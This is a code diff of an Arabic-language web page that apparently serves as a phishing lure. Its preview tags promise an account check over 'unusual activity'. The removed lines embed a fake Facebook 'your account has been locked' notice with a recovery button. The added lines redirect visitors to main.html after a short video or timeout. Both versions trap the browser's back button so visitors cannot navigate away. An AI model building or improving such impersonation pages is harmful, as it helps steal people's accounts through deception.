@@ -5,8 +5,8 @@
     <title>مرحبًا بك</title>
     <meta property="og:title" content="تحقق من حسابك">
     <meta property="og:description" content="تحقق من نشاط غير معتاد في حسابك">
-    <meta property="og:image" content="thumbnail.jpg">
-    <meta property="og:url" content="https://example.com">
+    <meta property="og:image" content="https://yourdomain.com/thumbnail.jpg">
+    <meta property="og:url" content="https://yourdomain.com">
     <meta name="twitter:card" content="summary_large_image">
     <style>
         body, html {
@@ -28,126 +28,21 @@
         <source src="intro.mp4" type="video/mp4">
         متصفحك لا يدعم عرض الفيديو.
     </video><script>
-    const redirectHtml = `<!DOCTYPE html>
+    const redirectUrl = "main.html"; // تأكد من وجود ملف main.html في نفس المجلد
 
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تم قفل حسابك</title>
-    <style>
-        body {
-            font-family: 'Arial', sans-serif;
-            background-color: #fff;
-            margin: 0;
-            padding: 0;
-            text-align: center;
-        }
-        .container {
-            max-width: 400px;
-            margin: 50px auto;
-            padding: 20px;
-        }
-        .header-graphic {
-            position: relative;
-            display: inline-block;
-        }
-        .facebook-icon {
-            width: 90px;
-            height: 90px;
-            background-color: rgba(24, 119, 242, 0.1);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto;
-            margin-bottom: 10px;
-        }
-        .facebook-icon img {
-            width: 48px;
-        }
-        .profile-pic-wrapper {
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            overflow: hidden;
-            border: 2px solid white;
-            position: absolute;
-            bottom: 0;
-            right: 0;
-        }
-        .profile-pic-wrapper img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        .lock-icon {
-            width: 32px;
-            position: absolute;
-            top: -10px;
-            left: -10px;
-        }
-        .message {
-            background-color: #f0f2f5;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 20px 0;
-            font-size: 14px;
-        }
-        a.button-link {
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            font-size: 16px;
-            border-radius: 6px;
-            cursor: pointer;
-            text-decoration: none;
-            display: inline-block;
-        }
-        a.button-link:hover {
-            background-color: #165ecf;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header-graphic">
-            <div class="facebook-icon">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="F Icon">
-                <div class="profile-pic-wrapper">
-                    <img src="profile.jpg" alt="Profile Picture">
-                </div>
-                <img class="lock-icon" src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="Lock Icon">
-            </div>
-        </div><h2>Tota، تم قفل حسابك</h2>
-    <p>لقد لاحظنا وجود نشاط غير معتاد على حسابك. قد يعني هذا أن شخصًا ما استخدم حسابك دون علمك.</p>
-    <div class="message">
-        تم قفل الحساب في نوفمبر 23، 2023<br>
-        لحمايتك، لا يظهر ملفك الشخصي للأشخاص على فيسبوك ولا يمكنك استخدام حسابك.
-    </div>
-    <p>سنرشدك من خلال اتباع بعض الخطوات لإنهاء قفل حسابك.</p>
-    <a class="button-link" href="https://example.com" target="_blank">استرجاع الحساب</a>
-</div>
+    const video = document.getElementById('introVideo');
 
-</body>
-</html>`;video.onended = () => {
-        document.open();
-        document.write(redirectHtml);
-        document.close();
+    video.onended = () => {
+        window.location.href = redirectUrl;
     };
 
     setTimeout(() => {
-        document.open();
-        document.write(redirectHtml);
-        document.close();
-    },12000);
+        window.location.href = redirectUrl;
+    }, 2000); // غيّر الرقم لتعديل المدة بالميلي ثانية
 
     window.history.pushState(null, null, window.location.href);
     window.onpopstate = function () {
-        document.open();
-        document.write(redirectHtml);
-        document.close();
+        window.location.href = redirectUrl;
     };
 </script>
 
